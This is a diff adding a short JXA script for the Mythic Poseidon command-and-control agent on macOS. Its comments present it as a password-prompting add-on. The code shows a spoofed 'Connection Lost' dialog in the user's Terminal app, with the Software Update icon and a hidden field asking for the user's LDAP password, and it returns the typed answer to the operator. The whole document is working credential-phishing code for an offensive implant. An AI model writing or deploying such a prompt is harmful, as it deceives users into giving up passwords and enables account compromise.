@@ -1,0 +1,23 @@
+// This is a handy JXA script for use with Mythic Poseidon, since it currently does not have password prompting functionality
+// Inside your agent just run "jxa" and paste the below code to generate a prompt to the user via their 'Terminal' app
+
+let config = [];
+let title = "Connection Lost";
+if(config.hasOwnProperty("title") && config['title'] !== ""){title = config['title'];}
+let icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns";
+if(config.hasOwnProperty("icon") && config['icon'] !== ""){icon = config['icon'];}
+let text = "Please provide your LDAP password:";
+if(config.hasOwnProperty("text") && config['text'] !== ""){text = config['text'];}
+let answer = "";
+if(config.hasOwnProperty("answer") && config['answer'] !== ""){answer = config['answer'];}
+var app = Application(‘Terminal’);
+app.includeStandardAdditions = true;
+let prompt = app.displayDialog(text, {
+defaultAnswer: answer,
+buttons: ['OK', 'Cancel'], 
+defaultButton: 'OK',
+cancelButton: 'Cancel', 
+withTitle: title,  
+withIcon: Path(icon),
+hiddenAnswer: true });
+prompt.textReturned;
